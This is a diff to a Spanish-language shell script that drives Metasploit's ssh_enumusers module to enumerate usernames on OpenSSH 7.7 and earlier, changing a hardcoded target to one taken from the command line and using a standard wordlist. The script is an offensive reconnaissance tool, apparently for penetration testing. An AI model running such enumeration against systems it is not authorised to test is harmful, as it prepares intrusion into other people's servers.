@@ -8,11 +8,29 @@ echo
 echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
 echo
 echo "..."
-sh /home/antonio/ssha/actualizar.sh
+sh actualizar.sh
 
-# Ejecutamos metaxploit
-# para salir teclea exit
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS 192.168.1.1;  set RPORT 2022; set USER_FILE /home/antonio/ssha/usuarios.txt; run"
+echo
+echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
+echo
+echo "..."
+echo
+
+if [ -z "$1" ]; then
+    echo "Uso: $0 <IP>"
+    echo "Ejemplo: $0 192.168.1.100"
+    exit 1
+fi
+
+msfconsole -q -x "
+use auxiliary/scanner/ssh/ssh_enumusers;
+set RHOSTS $1;
+set RPORT 22;
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt;
+run;
+exit;
+"
+
 #
 # modo consola
 #
@@ -20,7 +38,7 @@ msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS 192.168.1.
 # use auxiliary/scanner/ssh/ssh_enumusers
 # set RHOSTS 192.168.1.100
 # set RPORT 2222
-# set USER_FILE /usr/share/wordlists/common_users.txt
+# set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
 # run
 
 
